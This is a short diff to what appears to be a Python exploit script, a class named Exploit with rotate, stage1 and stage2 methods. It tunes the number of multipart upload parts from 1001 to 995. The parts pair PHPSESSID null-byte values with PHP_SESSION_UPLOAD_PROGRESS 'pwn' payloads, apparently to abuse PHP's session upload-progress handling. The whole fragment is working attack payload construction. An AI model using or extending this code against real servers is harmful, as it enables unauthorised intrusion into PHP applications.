@@ -1727,7 +1727,7 @@ class Exploit:
     def rotate(self):
         self.t.log(f"{YELLOW}[*] rotating worker{ENDC}")
         parts = [
-            {"name": f"f{i:04d}"[:5], "data": b"V" * 3000} for i in range(1001)
+            {"name": f"f{i:04d}"[:5], "data": b"V" * 3000} for i in range(995)
         ]
         parts += [
             {"name": "PHPSESSID", "data": b"\x00"},
@@ -1751,7 +1751,7 @@ class Exploit:
         time.sleep(0.5)
 
     def stage1(self):
-        parts = [{"name": f"p{i:04d}", "data": b"x"} for i in range(1001)]
+        parts = [{"name": f"p{i:04d}", "data": b"x"} for i in range(995)]
         parts += [
             {"name": "PHPSESSID", "data": b"\x00"},
             {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
@@ -1785,7 +1785,7 @@ class Exploit:
 
     def stage2(self):
         parts = [
-            {"name": f"f{i:04d}"[:5], "data": b"x" * 39} for i in range(1001)
+            {"name": f"f{i:04d}"[:5], "data": b"x" * 39} for i in range(995)
         ]
         parts += [
             {"name": "PHPSESSID", "data": b"\x00"},
